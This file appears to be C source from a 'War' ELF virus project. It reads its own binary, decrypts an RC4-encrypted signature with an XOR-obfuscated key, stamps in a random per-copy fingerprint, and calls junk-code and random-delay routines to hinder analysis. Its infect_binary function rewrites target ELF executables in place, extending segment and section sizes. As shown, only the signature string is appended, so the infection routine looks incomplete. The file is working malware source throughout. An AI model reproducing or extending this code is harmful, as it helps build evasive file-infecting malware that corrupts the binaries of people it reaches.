#include "../include/war.h"

static bool find_signature_location(virus_payload *payload) {
    
    unsigned char signature_pattern[] = { 0x99, 0xa4, 0x9c, 0x24, 0xb2 };
    size_t pattern_len = sizeof(signature_pattern);
    
    for (size_t i = 0; i < payload->size - pattern_len; i++) {
        if (memcmp(payload->code + i, signature_pattern, pattern_len) == 0) {
            payload->sig_offset = i;
            return true;
        }
    }
    unsigned char rc4_key[9];
    unsigned char OBFUSCATED_KEY[] = { 
        0x76, 0x70, 0x66, 0x66, 0x35, 0x23, 0x30, 0x66, 0x66
    };
    for (size_t i = 0; i < 9; i++) {
        rc4_key[i] = OBFUSCATED_KEY[i] ^ 0x42;
    }
    unsigned char test_buffer[64];
    const char target[] = "War version";
    size_t search_count = 0;
    for (size_t i = 0; i < payload->size - 64; i++) {
        memcpy(test_buffer, payload->code + i, 64);
        rc4_crypt(test_buffer, 64, rc4_key, 9);
        
        if (search_count % 10000 == 0) {
        }
        search_count++;
        
        if (memcmp(test_buffer, target, strlen(target)) == 0) {
            payload->sig_offset = i;
            
            test_buffer[63] = '\0';
            
            return true;
        }
    }
    return false;
}

static uint32_t generate_new_fingerprint(void) {
    uint32_t seed = 0;
    
    seed ^= (uint32_t)time(NULL);
    seed ^= (uint32_t)getpid();
    seed ^= (uint32_t)(uintptr_t)&seed;
    
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        uint32_t random_val;
        read(fd, &random_val, sizeof(random_val));
        seed ^= random_val;
        close(fd);
    }
    
    seed = (seed << 13) | (seed >> 19);
    seed ^= 0xDEADBEEF;
    
    return seed;
}

static void patch_signature(virus_payload *payload) {
    if (payload->sig_offset == 0) {
        return;
    }
    
    uint32_t new_fingerprint = generate_new_fingerprint();
    
    unsigned char rc4_key[9];
    unsigned char OBFUSCATED_KEY[] = { 
        0x76, 0x70, 0x66, 0x66, 0x35, 0x23, 0x30, 0x66, 0x66
    };
    for (size_t i = 0; i < 9; i++) {
        rc4_key[i] = OBFUSCATED_KEY[i] ^ 0x42;
    }
    
    char new_signature[64];
    snprintf(new_signature, sizeof(new_signature),
             "War version 1.0 (c)oded by jainavas - jvidal-t - [%08X]",
             new_fingerprint);
    
    unsigned char encrypted_sig[64];
    memcpy(encrypted_sig, new_signature, strlen(new_signature));
    rc4_crypt(encrypted_sig, strlen(new_signature), rc4_key, 9);
    
    
    memcpy(payload->code + payload->sig_offset, 
           encrypted_sig, 
           strlen(new_signature));
}

static virus_payload* read_self_code(void) {
    virus_payload *payload = malloc(sizeof(virus_payload));
    if (!payload) return NULL;
    
    int fd = custom_open("/proc/self/exe", O_RDONLY);
    if (fd < 0) {
        free(payload);
        return NULL;
    }
    
    struct stat st;
    if (fstat(fd, &st) < 0) {
        custom_close(fd);
        free(payload);
        return NULL;
    }
    
    void *self_data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    custom_close(fd);
    
    if (self_data == MAP_FAILED) {
        free(payload);
        return NULL;
    }
    
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)self_data;
    Elf64_Phdr *phdr = (Elf64_Phdr *)(self_data + ehdr->e_phoff);
    
    size_t min_offset = (size_t)-1;
    size_t max_end = 0;
    
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD) {
            if (phdr[i].p_offset < min_offset) {
                min_offset = phdr[i].p_offset;
            }
            size_t segment_end = phdr[i].p_offset + phdr[i].p_filesz;
            if (segment_end > max_end) {
                max_end = segment_end;
            }
        }
    }
    
    if (min_offset == (size_t)-1 || max_end == 0) {
        munmap(self_data, st.st_size);
        free(payload);
        return NULL;
    }
    
    size_t total_size = max_end - min_offset;
    void *code_start = self_data + min_offset;
    
    payload->code = malloc(total_size);
    if (!payload->code) {
        munmap(self_data, st.st_size);
        free(payload);
        return NULL;
    }
    
    memcpy(payload->code, code_start, total_size);
    payload->size = total_size;
    payload->sig_offset = 0;
    
    munmap(self_data, st.st_size);
    
    return payload;
}

static int write_infected_file(const char *filepath, void *data, size_t size)
{
	int fd;
	ssize_t written;
	struct stat st;
	mode_t original_mode = 0644;
	if (stat(filepath, &st) == 0)
	{
		original_mode = st.st_mode;
	}
	fd = custom_open(filepath, O_WRONLY | O_TRUNC);
	if (fd < 0)
		return -1;
	written = custom_write(fd, data, size);
	fchmod(fd, original_mode);
	custom_close(fd);
	if (written < 0 || (size_t)written != size)
		return -1;
	return 0;
}

int infect_binary(const char *filepath)
{
	t_elf elf = {0};
	virus_payload *virus = NULL;
	const char *sig;
	size_t sig_len;
	void *new_data = NULL;
	size_t new_size;
	size_t original_size;
	long long save;
	Elf64_Ehdr *new_ehdr;
	save = pepino;
	Elf64_Phdr *new_phdr;
	Elf64_Shdr *new_shdr;
	int ret = -1;
	insert_garbage();
	int order = get_execution_order();
	pepino *= 11;
	if (order == 0 || order == 1)
	{
		if (parse_elf(filepath, &elf) < 0)
			return -1;
		insert_garbage3();
	}
	pepino += 23432;
	if (order == 2 || order == 3)
	{
		if (parse_elf(filepath, &elf) < 0)
			return -1;
		insert_garbage4();
	}
	insert_garbage4();
	if (is_infected(&elf))
	{
		cleanup_elf(&elf);
		return 0;
	}
	random_delay();
	virus = read_self_code();
	if (!virus) {
		cleanup_elf(&elf);
		return -1;
	}
	if (!find_signature_location(virus)) {
		free(virus->code);
		free(virus);
		cleanup_elf(&elf);
		return -1;
	}
	patch_signature(virus);
	unsigned char rc4_key[9];
	unsigned char OBFUSCATED_KEY[] = { 
		0x76, 0x70, 0x66, 0x66, 0x35, 0x23, 0x30, 0x66, 0x66
	};
	for (size_t i = 0; i < 9; i++) {
		rc4_key[i] = OBFUSCATED_KEY[i] ^ 0x42;
	}
	static char final_signature[128];
	memset(final_signature, 0, sizeof(final_signature));
	size_t sig_to_copy = 59;
	if (virus->sig_offset + sig_to_copy > virus->size) {
		sig_to_copy = virus->size - virus->sig_offset;
	}
	memcpy(final_signature, virus->code + virus->sig_offset, sig_to_copy);
	rc4_crypt((unsigned char *)final_signature, sig_to_copy, rc4_key, 9);
	final_signature[sig_to_copy] = '\0';
	sig = final_signature;
	sig_len = strlen(sig) + 1;
	free(virus->code);
	free(virus);
	virus = NULL;
	original_size = elf.size;
	new_size = original_size + sig_len;
	new_data = malloc(new_size);
	if (!new_data)
	{
		cleanup_elf(&elf);
		return -1;
	}
	insert_garbage5();
	memcpy(new_data, elf.data, original_size);
	cleanup_elf(&elf);
	memcpy((char *)new_data + original_size, sig, sig_len);
	new_ehdr = (Elf64_Ehdr *)new_data;
	new_phdr = (Elf64_Phdr *)((char *)new_data + new_ehdr->e_phoff);
	new_shdr = (Elf64_Shdr *)((char *)new_data + new_ehdr->e_shoff);
	for (int i = 0; i < new_ehdr->e_phnum; i++)
	{
		if (new_phdr[i].p_type == PT_LOAD)
		{
			if (new_phdr[i].p_offset + new_phdr[i].p_filesz == original_size)
			{
				new_phdr[i].p_filesz += sig_len;
				new_phdr[i].p_memsz += sig_len;
				break;
			}
		}
	}
	int last_section = -1;
	size_t max_offset = 0;
	for (int i = 0; i < new_ehdr->e_shnum; i++)
	{
		size_t section_end = new_shdr[i].sh_offset + new_shdr[i].sh_size;
		if (section_end > max_offset && section_end <= original_size)
		{
			max_offset = section_end;
			last_section = i;
		}
	}
	insert_garbage5();
	if (last_section >= 0)
		new_shdr[last_section].sh_size += sig_len;
	ret = write_infected_file(filepath, new_data, new_size);
	free(new_data);
	pepino = save;
	pepino *= 1;	
	return ret;
}